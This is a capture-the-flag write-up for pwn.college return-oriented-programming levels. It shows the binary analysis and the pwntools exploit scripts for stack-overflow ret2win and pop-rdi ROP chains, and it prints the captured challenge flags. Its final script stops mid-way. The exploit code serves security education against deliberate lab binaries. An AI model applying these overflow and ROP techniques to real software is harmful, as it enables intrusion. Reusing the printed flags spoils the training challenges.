---
custom_edit_url: null
sidebar_position: 2
slug: /pwn-college/program-security/return-oriented-programming
---

## Loose Link (Easy)

```
hacker@return-oriented-programming~loose-link-easy:/$ /challenge/loose-link-easy 
###
### Welcome to /challenge/loose-link-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

In this challenge, there is a win() function.
win() will open the flag and send its data to stdout; it is at 0x401d8e.
In order to get the flag, you will need to call this function.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7ffee0096228, 72 bytes after the start of your input buffer.
That means that you will need to input at least 80 bytes (48 to fill the buffer,
24 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
```

The solution to this challenge is a simple ret2win exploit as we used in [this](https://writeups.kunull.net/pwn-college/intro-to-cybersecurity/binary-exploitation#pies-easy) challenge.

Let's find the offset of `win()` within the program.

### Bianry Analysis

#### `win()`

```
hacker@return-oriented-programming~loose-link-easy:/$ objdump -d -M intel /challenge/loose-link-easy | grep "<win>:"
0000000000401d8e <win>:
```

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

# Initialize required values
win_offset = 0x401d8e

# Calculate offset
offset = 72

# Craft payload
payload = b"A" * offset
payload += p64(win_offset)

attempt = 0

while True:
    attempt += 1
    print(f"[+] Attempt {attempt}")

    p = process('/challenge/loose-link-easy')
    try:
        p.recvuntil("and 8 that will overwrite the return address).")
        p.send(payload)
        output = p.recvall(timeout=1).decode(errors="ignore")

        if "pwn.college{" in output:
            print("[!!!] FLAG FOUND !!!")
            print(output)
            break

    except Exception:
        pass
    finally:
        p.close()
```

```
hacker@return-oriented-programming~loose-link-easy:/$ python ~/script.py 
[+] Attempt 1
[+] Starting local process '/challenge/loose-link-easy': pid 38562
/home/hacker/script.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("and 8 that will overwrite the return address).")
[+] Receiving all data: Done (513B)
[*] Process '/challenge/loose-link-easy' stopped with exit code -11 (SIGSEGV) (pid 38562)
[!!!] FLAG FOUND !!!

Received 80 bytes! This is potentially 1 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 2 gadgets of ROP chain at 0x7ffd181688f8.
| 0x0000000000401d8e: endbr64  ; push rbp ; mov rbp, rsp ; lea rdi, [rip + 0x13fb] ; call 0x401150 ; 
| 0x0000000000000000: (UNMAPPED MEMORY)

Leaving!
You win! Here is your flag:
pwn.college{Y40hUq96Ina_w4qo4LYvtgBa4yR.0VM0MDL4ITM0EzW} 
```

&nbsp;

## Loose Link (Hard)

```
hacker@return-oriented-programming~loose-link-hard:/$ /challenge/loose-link-hard 
###
### Welcome to /challenge/loose-link-hard!
###
```

As expected, this level, gives us nothing.

We need the following for exploitation:

- [ ] Location of buffer
- [ ] Location of return address to `main()`
- [ ] Offset of instruction in `win()` within the program

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010d0  putchar@plt
0x00000000004010e0  __errno_location@plt
0x00000000004010f0  puts@plt
0x0000000000401100  write@plt
0x0000000000401110  printf@plt
0x0000000000401120  geteuid@plt
0x0000000000401130  read@plt
0x0000000000401140  setvbuf@plt
0x0000000000401150  open@plt
0x0000000000401160  strerror@plt
0x0000000000401170  _start
0x00000000004011a0  _dl_relocate_static_pie
0x00000000004011b0  deregister_tm_clones
0x00000000004011e0  register_tm_clones
0x0000000000401220  __do_global_dtors_aux
0x0000000000401250  frame_dummy
0x0000000000401256  bin_padding
0x00000000004018a6  win
0x00000000004019a3  challenge
0x00000000004019e2  main
0x0000000000401aa0  __libc_csu_init
0x0000000000401b10  __libc_csu_fini
0x0000000000401b18  _fini
```

Let's get the offset of `win()` first.

#### `win()`

```
pwndbg> info address win
Symbol "win" is at 0x4018a6 in a file compiled without debugging.
```

- [ ] Location of buffer
- [ ] Location of return address to `main()`
- [x] Offset of instruction in `win()` within the program: `0x4018a6`

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x00000000004019a3 <+0>:     endbr64
   0x00000000004019a7 <+4>:     push   rbp
   0x00000000004019a8 <+5>:     mov    rbp,rsp
   0x00000000004019ab <+8>:     sub    rsp,0x40
   0x00000000004019af <+12>:    mov    DWORD PTR [rbp-0x24],edi
   0x00000000004019b2 <+15>:    mov    QWORD PTR [rbp-0x30],rsi
   0x00000000004019b6 <+19>:    mov    QWORD PTR [rbp-0x38],rdx
   0x00000000004019ba <+23>:    lea    rax,[rbp-0x20]
   0x00000000004019be <+27>:    mov    edx,0x1000
   0x00000000004019c3 <+32>:    mov    rsi,rax
   0x00000000004019c6 <+35>:    mov    edi,0x0
   0x00000000004019cb <+40>:    call   0x401130 <read@plt>
   0x00000000004019d0 <+45>:    mov    DWORD PTR [rbp-0x4],eax
   0x00000000004019d3 <+48>:    lea    rdi,[rip+0x732]        # 0x40210c
   0x00000000004019da <+55>:    call   0x4010f0 <puts@plt>
   0x00000000004019df <+60>:    nop
   0x00000000004019e0 <+61>:    leave
   0x00000000004019e1 <+62>:    ret
End of assembler dump.
```

We can see that a call to `read@plt` is made at `challenge+40`.
Let's set a breakpoint and run the program.

```
pwndbg> break *(challenge+40)
Breakpoint 1 at 0x4019cb
```

```
pwndbg> run
Starting program: /challenge/loose-link-hard 
###
### Welcome to /challenge/loose-link-hard!
###


Breakpoint 1, 0x00000000004019cb in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffdb569ada0 —▸ 0x401aa0 (__libc_csu_init) ◂— endbr64 
 RBX  0x401aa0 (__libc_csu_init) ◂— endbr64 
 RCX  0x7ffdb569aee8 —▸ 0x7ffdb569c678 ◂— '/challenge/loose-link-hard'
 RDX  0x1000
 RDI  0
 RSI  0x7ffdb569ada0 —▸ 0x401aa0 (__libc_csu_init) ◂— endbr64 
 R8   0
 R9   0x2b
 R10  0x40057f ◂— 0x66756276746573 /* 'setvbuf' */
 R11  0x7ec61f7bfce0 (setvbuf) ◂— endbr64 
 R12  0x401170 (_start) ◂— endbr64 
 R13  0x7ffdb569aee0 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffdb569adc0 —▸ 0x7ffdb569adf0 ◂— 0
 RSP  0x7ffdb569ad80 —▸ 0x7ec61f9244a0 (_IO_file_jumps) ◂— 0
 RIP  0x4019cb (challenge+40) ◂— call read@plt
───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────
 ► 0x4019cb <challenge+40>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffdb569ada0 —▸ 0x401aa0 (__libc_csu_init) ◂— endbr64 
        nbytes: 0x1000
 
   0x4019d0 <challenge+45>    mov    dword ptr [rbp - 4], eax
   0x4019d3 <challenge+48>    lea    rdi, [rip + 0x732]           RDI => 0x40210c ◂— 'Leaving!'
   0x4019da <challenge+55>    call   puts@plt                    <puts@plt>
 
   0x4019df <challenge+60>    nop    
   0x4019e0 <challenge+61>    leave  
   0x4019e1 <challenge+62>    ret    
 
   0x4019e2 <main>            endbr64 
   0x4019e6 <main+4>          push   rbp
   0x4019e7 <main+5>          mov    rbp, rsp
   0x4019ea <main+8>          sub    rsp, 0x20
────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffdb569ad80 —▸ 0x7ec61f9244a0 (_IO_file_jumps) ◂— 0
01:0008│-038     0x7ffdb569ad88 —▸ 0x7ffdb569aef8 —▸ 0x7ffdb569c693 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-030     0x7ffdb569ad90 —▸ 0x7ffdb569aee8 —▸ 0x7ffdb569c678 ◂— '/challenge/loose-link-hard'
03:0018│-028     0x7ffdb569ad98 ◂— 0x11f7bfde5
04:0020│ rax rsi 0x7ffdb569ada0 —▸ 0x401aa0 (__libc_csu_init) ◂— endbr64 
05:0028│-018     0x7ffdb569ada8 —▸ 0x7ffdb569adf0 ◂— 0
06:0030│-010     0x7ffdb569adb0 —▸ 0x401170 (_start) ◂— endbr64 
07:0038│-008     0x7ffdb569adb8 —▸ 0x7ffdb569aee0 ◂— 1
──────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x4019cb challenge+40
   1         0x401a87 main+165
   2   0x7ec61f75f083 __libc_start_main+243
   3         0x40119e _start+46
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of buffer: `0x7ffdb569ada0`
- [ ] Location of return address to `main()`
- [x] Offset of instruction in `win()` within the program: `0x4018a6`

```
pwndbg> info frame
Stack level 0, frame at 0x7ffdb569add0:
 rip = 0x4019cb in challenge; saved rip = 0x401a87
 called by frame at 0x7ffdb569ae00
 Arglist at 0x7ffdb569adc0, args: 
 Locals at 0x7ffdb569adc0, Previous frame's sp is 0x7ffdb569add0
 Saved registers:
  rbp at 0x7ffdb569adc0, rip at 0x7ffdb569adc8
```

- [x] Location of buffer: `0x7ffdb569ada0`
- [x] Location of return address to `main()`: `0x7ffdb569adc8`
- [x] Offset of instruction in `win()` within the program: `0x4018a6`

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

# Initialize required values
win_offset = 0x4018a6
buffer_addr = 0x7ffdb569ada0
addr_of_saved_ip = 0x7ffdb569adc8

# Calculate offset
offset = addr_of_saved_ip - buffer_addr

# Craft payload
payload = b"A" * offset
payload += p64(win_offset)

attempt = 0

while True:
    attempt += 1
    print(f"[+] Attempt {attempt}")

    p = process('/challenge/loose-link-hard')
    try:
        p.send(payload)
        output = p.recvall(timeout=1).decode(errors="ignore")

        if "pwn.college{" in output:
            print("[!!!] FLAG FOUND !!!")
            print(output)
            break

    except Exception:
        pass
    finally:
        p.close()
```

```
hacker@return-oriented-programming~loose-link-hard:/$ python ~/script.py 
[+] Attempt 1
[+] Starting local process '/challenge/loose-link-hard': pid 5958
[+] Receiving all data: Done (148B)
[*] Process '/challenge/loose-link-hard' stopped with exit code -11 (SIGSEGV) (pid 5958)
[!!!] FLAG FOUND !!!
###
### Welcome to /challenge/loose-link-hard!
###

Leaving!
You win! Here is your flag:
pwn.college{wMKUPEPkoVPhW8f3RHkBro9Nftw.0lM0MDL4ITM0EzW}
```

&nbsp;

## Call Chain (Easy)

```
hacker@return-oriented-programming~call-chain-easy:/$ /challenge/call-chain-easy 
###
### Welcome to /challenge/call-chain-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

In this challenge, there are 2 stages of win functions. The functions are labeled `win_stage_1` through `win_stage_2`.
In order to get the flag, you will need to call all of these stages in order.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7fffa5868628, 72 bytes after the start of your input buffer.
That means that you will need to input at least 80 bytes (48 to fill the buffer,
24 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
```

This time we have to call two functions: `win_stage_1` and `win_stage_2`.

### Binary Analysis

#### `win_stage_1`

```
hacker@return-oriented-programming~call-chain-easy:/$ objdump -d -M intel /challenge/call-chain-easy | grep "<win_stage_1>:"
0000000000401ffd <win_stage_1>:
```

#### `win_stage_2`

```
hacker@return-oriented-programming~call-chain-easy:/$ objdump -d -M intel /challenge/call-chain-easy | grep "<win_stage_2>:"
00000000004020aa <win_stage_2>:
```

If we overwrite the return address with the address of `win_stage_1` and place the address of `win_stage_2` after it, when the program returns from `win_stage_1`, it will execute `win_stage_2`, thus chaining our attack for us. 

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

# Initialize required values
win_stage_1_offset = 0x401ffd
win_stage_2_offset = 0x4020aa

# Calculate offset
offset = 72

# Craft payload
payload = b"A" * offset
payload += p64(win_stage_1_offset)
payload += p64(win_stage_2_offset)

attempt = 0

while True:
    attempt += 1
    print(f"[+] Attempt {attempt}")

    p = process('/challenge/call-chain-easy')
    try:
        p.recvuntil("and 8 that will overwrite the return address).")
        p.send(payload)
        output = p.recvall(timeout=1).decode(errors="ignore")

        if "pwn.college{" in output:
            print("[!!!] FLAG FOUND !!!")
            print(output)
            break

    except Exception:
        pass
    finally:
        p.close()
```

```
hacker@return-oriented-programming~call-chain-easy:/$ python ~/script.py 
[+] Attempt 1
[+] Starting local process '/challenge/call-chain-easy': pid 4197
/home/hacker/script.py:23: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("and 8 that will overwrite the return address).")
[+] Receiving all data: Done (1.17KB)
[*] Process '/challenge/call-chain-easy' stopped with exit code -11 (SIGSEGV) (pid 4197)
[!!!] FLAG FOUND !!!

Received 88 bytes! This is potentially 2 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 3 gadgets of ROP chain at 0x7ffd95ca9c08.
| 0x0000000000401ffd: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; mov esi, 0 ; lea rdi, [rip + 0x117a] ; mov eax, 0 ; call 0x401210 ; 
| 0x00000000004020aa: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; mov esi, 0 ; lea rdi, [rip + 0x10cd] ; mov eax, 0 ; call 0x401210 ; 
| 0x00007ffd95ca9d38: xchg edi, eax ; test eax, 0x7ffd95ca ; add byte ptr [rax], al ; mov al, 0xa9 ; retf 0xfd95 ; jg 0x7ffd95ca9d47 ; add ah, al ; test eax, 0x7ffd95ca ; add byte ptr [rax], al ; loopne 0x7ffd95ca9cfb ; retf 0xfd95 ; jg 0x7ffd95ca9d57 ; add byte ptr [rip - 0x26a3556], dl ; jg 0x7ffd95ca9d5f ; add byte ptr [rax - 0x26a3556], dh ; jg 0x7ffd95ca9d67 ; add byte ptr [rsi - 0x26a3556], dh ; jg 0x7ffd95ca9d6f ; add bl, dl ; stosb byte ptr [rdi], al ; retf 0xfd95 ; jg 0x7ffd95ca9d77 ; 

Leaving!
pwn.college{cBWEQcy5TduarDbN4Kk3_8Qyq80.01M0MDL4ITM0EzW}
```

&nbsp;

## Call Chain (Hard)

```
hacker@return-oriented-programming~call-chain-hard:/$ /challenge/call-chain-hard 
###
### Welcome to /challenge/call-chain-hard!
###
```

Let's check which functions the program has.

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010c0  putchar@plt
0x00000000004010d0  puts@plt
0x00000000004010e0  write@plt
0x00000000004010f0  printf@plt
0x0000000000401100  lseek@plt
0x0000000000401110  close@plt
0x0000000000401120  read@plt
0x0000000000401130  setvbuf@plt
0x0000000000401140  open@plt
0x0000000000401150  _start
0x0000000000401180  _dl_relocate_static_pie
0x0000000000401190  deregister_tm_clones
0x00000000004011c0  register_tm_clones
0x0000000000401200  __do_global_dtors_aux
0x0000000000401230  frame_dummy
0x0000000000401236  bin_padding
0x000000000040223e  win_stage_1
0x00000000004022eb  win_stage_2
0x000000000040239c  challenge
0x00000000004023e7  main
0x00000000004024a0  __libc_csu_init
0x0000000000402510  __libc_csu_fini
0x0000000000402518  _fini
```

We need the following for exploitation:

- [ ] Location of buffer
- [ ] Location of return address to `main()`
- [ ] Offset of instruction in `win_stage_1()` within the program
- [ ] Offset of instruction in `win_stage_2()` within the program

Let's first get the offsets of the `win_stage_*()` functions.

#### `win_stage_1()`

```
pwndbg> info address win_stage_1
Symbol "win_stage_1" is at 0x40223e in a file compiled without debugging.
```

#### `win_stage_2()`

```
pwndbg> info address win_stage_2
Symbol "win_stage_2" is at 0x4022eb in a file compiled without debugging.
```

- [ ] Location of buffer
- [ ] Location of return address to `main()`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223e`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x4022eb`

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x000000000040239c <+0>:     endbr64
   0x00000000004023a0 <+4>:     push   rbp
   0x00000000004023a1 <+5>:     mov    rbp,rsp
   0x00000000004023a4 <+8>:     sub    rsp,0xa0
   0x00000000004023ab <+15>:    mov    DWORD PTR [rbp-0x84],edi
   0x00000000004023b1 <+21>:    mov    QWORD PTR [rbp-0x90],rsi
   0x00000000004023b8 <+28>:    mov    QWORD PTR [rbp-0x98],rdx
   0x00000000004023bf <+35>:    lea    rax,[rbp-0x80]
   0x00000000004023c3 <+39>:    mov    edx,0x1000
   0x00000000004023c8 <+44>:    mov    rsi,rax
   0x00000000004023cb <+47>:    mov    edi,0x0
   0x00000000004023d0 <+52>:    call   0x401120 <read@plt>
   0x00000000004023d5 <+57>:    mov    DWORD PTR [rbp-0x4],eax
   0x00000000004023d8 <+60>:    lea    rdi,[rip+0xc2b]        # 0x40300a
   0x00000000004023df <+67>:    call   0x4010d0 <puts@plt>
   0x00000000004023e4 <+72>:    nop
   0x00000000004023e5 <+73>:    leave
   0x00000000004023e6 <+74>:    ret
End of assembler dump.
```

A the call to `read@plt` is made at `challenge+52`.
Let's set a breakpoint and run the program.

```
pwndbg> break *(challenge+52)
Breakpoint 1 at 0x4023d0
```

```
pwndbg> run
Starting program: /challenge/call-chain-hard 
###
### Welcome to /challenge/call-chain-hard!
###

LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────
 RAX  0x7fff0ca86600 —▸ 0x715c479d24a0 (_IO_file_jumps) ◂— 0
 RBX  0x4024a0 (__libc_csu_init) ◂— endbr64 
 RCX  0x7fff0ca867a8 —▸ 0x7fff0ca87678 ◂— '/challenge/call-chain-hard'
 RDX  0x1000
 RDI  0
 RSI  0x7fff0ca86600 —▸ 0x715c479d24a0 (_IO_file_jumps) ◂— 0
 R8   0
 R9   0x2b
 R10  0xfffffffffffff58f
 R11  0x715c4786dce0 (setvbuf) ◂— endbr64 
 R12  0x401150 (_start) ◂— endbr64 
 R13  0x7fff0ca867a0 ◂— 1
 R14  0
 R15  0
 RBP  0x7fff0ca86680 —▸ 0x7fff0ca866b0 ◂— 0
 RSP  0x7fff0ca865e0 ◂— 0
 RIP  0x4023d0 (challenge+52) ◂— call read@plt
──────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────
 ► 0x4023d0 <challenge+52>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7fff0ca86600 —▸ 0x715c479d24a0 (_IO_file_jumps) ◂— 0
        nbytes: 0x1000
 
   0x4023d5 <challenge+57>    mov    dword ptr [rbp - 4], eax
   0x4023d8 <challenge+60>    lea    rdi, [rip + 0xc2b]           RDI => 0x40300a ◂— 'Leaving!'
   0x4023df <challenge+67>    call   puts@plt                    <puts@plt>
 
   0x4023e4 <challenge+72>    nop    
   0x4023e5 <challenge+73>    leave  
   0x4023e6 <challenge+74>    ret    
 
   0x4023e7 <main>            endbr64 
   0x4023eb <main+4>          push   rbp
   0x4023ec <main+5>          mov    rbp, rsp
   0x4023ef <main+8>          sub    rsp, 0x20
───────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7fff0ca865e0 ◂— 0
01:0008│-098     0x7fff0ca865e8 —▸ 0x7fff0ca867b8 —▸ 0x7fff0ca87693 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-090     0x7fff0ca865f0 —▸ 0x7fff0ca867a8 —▸ 0x7fff0ca87678 ◂— '/challenge/call-chain-hard'
03:0018│-088     0x7fff0ca865f8 ◂— 0x1479d6723
04:0020│ rax rsi 0x7fff0ca86600 —▸ 0x715c479d24a0 (_IO_file_jumps) ◂— 0
05:0028│-078     0x7fff0ca86608 —▸ 0x715c479dc540 ◂— 0x715c479dc540
06:0030│-070     0x7fff0ca86610 ◂— 0
07:0038│-068     0x7fff0ca86618 —▸ 0x715c4787b5dd (_IO_default_setbuf+253) ◂— mov edx, dword ptr [rbx]
─────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x4023d0 challenge+52
   1         0x40248c main+165
   2   0x715c4780d083 __libc_start_main+243
   3         0x40117e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of buffer: `0x7fff0ca86600`
- [ ] Location of return address to `main()`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223e`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x4022eb`

```
pwndbg> info frame
Stack level 0, frame at 0x7fff0ca86690:
 rip = 0x4023d0 in challenge; saved rip = 0x40248c
 called by frame at 0x7fff0ca866c0
 Arglist at 0x7fff0ca86680, args: 
 Locals at 0x7fff0ca86680, Previous frame's sp is 0x7fff0ca86690
 Saved registers:
  rbp at 0x7fff0ca86680, rip at 0x7fff0ca86688
```

- [x] Location of buffer: `0x7fff0ca86600`
- [x] Location of return address to `main()`: `0x7fff0ca86688`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223e`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x4022eb`

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

# Initialize required values
win_stage_1_offset = 0x40223e
win_stage_2_offset = 0x4022eb
buffer_addr = 0x7fff0ca86600
addr_of_saved_ip = 0x7fff0ca86688

# Calculate offset
offset = addr_of_saved_ip - buffer_addr

# Craft payload
payload = b"A" * offset
payload += p64(win_stage_1_offset)
payload += p64(win_stage_2_offset)

attempt = 0

while True:
    attempt += 1
    print(f"[+] Attempt {attempt}")

    p = process('/challenge/call-chain-hard')
    try:
        p.send(payload)
        output = p.recvall(timeout=1).decode(errors="ignore")

        if "pwn.college{" in output:
            print("[!!!] FLAG FOUND !!!")
            print(output)
            break

    except Exception:
        pass
    finally:
        p.close()
```

```
hacker@return-oriented-programming~call-chain-hard:/$ python ~/script.py 
[+] Attempt 1
[+] Starting local process '/challenge/call-chain-hard': pid 12207
[+] Receiving all data: Done (118B)
[*] Process '/challenge/call-chain-hard' stopped with exit code -11 (SIGSEGV) (pid 12207)
[!!!] FLAG FOUND !!!
###
### Welcome to /challenge/call-chain-hard!
###

Leaving!
pwn.college{kUbPQlmZDS13sRzrmbin50xWwe_.0FN0MDL4ITM0EzW}
```

&nbsp;

## Chain of Command (Easy)

```
hacker@return-oriented-programming~chain-of-command-easy:/$ /challenge/chain-of-command-easy 
###
### Welcome to /challenge/chain-of-command-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

In this challenge, there are 5 stages of win functions. The functions are labeled `win_stage_1` through `win_stage_5`.
In order to get the flag, you will need to call all of these stages in order.

In addition to calling each function in the right order, you must also pass an argument to each of them! The argument
you pass will be the stage number. For instance, `win_stage_1(1)`.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7ffcd79c2e68, 120 bytes after the start of your input buffer.
That means that you will need to input at least 128 bytes (101 to fill the buffer,
19 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
```

This time we have to pass arguments to the `win_stage_*()` functions. In x86-64, the first argument goes inside the `rdi` register.
Therefore, we will have to use a `pop rdi ; ret` gadget to load the arguments.

All in all, we need the following to craft the exploit:

- [ ] Offset of instruction in `win_stage_1()` within the program 
- [ ] Offset of instruction in `win_stage_2()` within the program
- [ ] Offset of instruction in `win_stage_3()` within the program
- [ ] Offset of instruction in `win_stage_4()` within the program
- [ ] Offset of instruction in `win_stage_5()` within the program
- [ ] Offset of `pop rdi ; ret` gadget within the program

### Binary analysis

Let's first get the offsets of all the `win_stage_*()` functions.

#### `win_stage_1()`

```
hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_1>:"
00000000004028ba <win_stage_1>:
```

#### `win_stage_2()`

```
hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_2>:"
0000000000402615 <win_stage_2>:
```

#### `win_stage_3()`

```
hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_3>:"
00000000004026f5 <win_stage_3>:
```

#### `win_stage_4()`

```
hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_4>:"
000000000040252f <win_stage_4>:
```

#### `win_stage_5()`

```
hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_5>:"
00000000004027d7 <win_stage_5>:
```

- [x] Offset of instruction in `win_stage_1()` within the program: `0x4028ba`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x402615`
- [x] Offset of instruction in `win_stage_3()` within the program: `0x4026f5`
- [x] Offset of instruction in `win_stage_4()` within the program: `0x40252f`
- [x] Offset of instruction in `win_stage_5()` within the program: `0x4027d7`
- [ ] Offset of `pop rdi ; ret` gadget within the program

#### `pop rdi ; ret` gadget

Now, we have to find the address of the ROP gadget.

```
hacker@return-oriented-programming~chain-of-command-easy:/$ ROPgadget --binary /challenge/chain-of-command-easy | grep "pop rdi ; ret"
0x0000000000402ca3 : pop rdi ; ret
```

- [x] Offset of instruction in `win_stage_1()` within the program: `0x4028ba`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x402615`
- [x] Offset of instruction in `win_stage_3()` within the program: `0x4026f5`
- [x] Offset of instruction in `win_stage_4()` within the program: `0x40252f`
- [x] Offset of instruction in `win_stage_5()` within the program: `0x4027d7`
- [x] Offset of `pop rdi ; ret` gadget within the program: `0x402ca3`

### ROP chain

- First we have to replace the return address with the address of the `pop rdi ; ret` gadget so that it is executed when `challenge()` returns.
- Then we have to chain it with `p64(1)`, the relevant argument for on the `win_stage_1()` function so that it gets popped into the `rdi` register.
- Finally we chain it with the address of the `win_stage_1@plt` call.

```
<== Value is stored at the address
<-- Points to the address

═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
rsp --> return address ==> │  00 00 00 00 00 40 2c a3  │ --> ( pop rdi ; ret )
			   │  00 00 00 00 00 00 00 01  │ ( 1 )
			   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
			   │  00 00 00 00 00 40 2b ba  │ --> ( win_stage_1() )
			   └───────────────────────────┘
			   ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> challenge() return
	// Pop the value pointed to by rsp into rip and move rsp by 8 bytes.
═══════════════════════════════════════════════════════════════════════════════════

Stack:
			   ┌───────────────────────────┐
         	   rsp --> │  00 00 00 00 00 00 00 01  │ ( 1 )
			   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
			   │  00 00 00 00 00 40 2b ba  │ --> ( win_stage_1() ) 
			   └───────────────────────────┘
			   ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rdi
	// Pop the value pointed to by rsp into rdi and move the rsp by 8 bytes.
═══════════════════════════════════════════════════════════════════════════════════

Stack:
			   ┌───────────────────────────┐
		   rsp --> │  00 00 00 00 00 40 2b ba  │ --> ( win_stage_1() )
			   └───────────────────────────┘
			   ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x01

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
	// Pop the address of win_stage_1() pointed to by rsp into rip and move rsp
        // by 8 bytes.
═══════════════════════════════════════════════════════════════════════════════════

Stack:
			   ┌───────────────────────────┐
		   rsp --> │  .. .. .. .. .. .. .. ..  │ 
			   └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x01

═══════════════════════════════════════════════════════════════════════════════════
rip --> win_stage_1()
	// Call win_stage_1() with the argument that is stored in the rdi register.
═══════════════════════════════════════════════════════════════════════════════════
```

This is to be repeated for all the `win_stage_*()` functions.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

# Initialize required values
win_stage_1_offset = 0x4028ba
win_stage_1_arg = 1
win_stage_2_offset = 0x402615
win_stage_2_arg = 2
win_stage_3_offset = 0x4026f5
win_stage_3_arg = 3
win_stage_4_offset = 0x40252f
win_stage_4_arg = 4
win_stage_5_offset = 0x4027d7
win_stage_5_arg = 5

# Calculate offset
offset = 120

# Gadget address found
pop_rdi_ret = 0x402ca3

# Base offset to reach the return address
payload = b"A" * offset

# Stage 1: win_stage_1(1)
payload += p64(pop_rdi_ret)
payload += p64(1)
payload += p64(win_stage_1_offset)

# Stage 2: win_stage_2(2)
payload += p64(pop_rdi_ret)
payload += p64(2)
payload += p64(win_stage_2_offset)

# Stage 3: win_stage_3(3)
payload += p64(pop_rdi_ret)
payload += p64(3)
payload += p64(win_stage_3_offset)

# Stage 4: win_stage_4(4)
payload += p64(pop_rdi_ret)
payload += p64(4)
payload += p64(win_stage_4_offset)

# Stage 5: win_stage_5(5)
payload += p64(pop_rdi_ret)
payload += p64(5)
payload += p64(win_stage_5_offset)

